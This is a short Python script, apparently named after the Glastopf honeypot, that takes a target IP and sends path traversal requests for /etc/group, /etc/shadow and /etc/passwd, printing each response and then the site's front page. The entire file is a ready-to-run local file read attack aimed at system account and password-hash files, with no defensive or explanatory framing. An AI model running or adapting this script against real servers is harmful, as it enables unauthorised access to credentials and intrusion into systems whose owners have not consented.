#!/usr/bin/python

from bs4 import BeautifulSoup as bs
import requests
import sys

if len(sys.argv)==2:
    ip=sys.argv[1]
else:
    print('Usage glastopf.py <ip_address>')
    sys.exit(0)

r=requests.get('http://' + ip + "?../etc/group")
r=bs(r.text, "html.parser")
print("###################################################")
print("###############  /etc/group      ##################")
print(r)
print("###################################################")

r=requests.get('http://' + ip + "?../etc/shadow")
r=bs(r.text, "html.parser")
print("###################################################")
print("###############  /etc/shadow      ##################")
print(r)
print("###################################################")

r=requests.get('http://' + ip + "?../etc/passwd")
r=bs(r.text, "html.parser")
print("###################################################")
print("###############  /etc/passwd      ##################")
print(r)
print("###################################################")

r=bs(r.text, "html.parser")
r=requests.get('http://' + ip)
print("###################################################")
print(r.text)
print("###################################################")
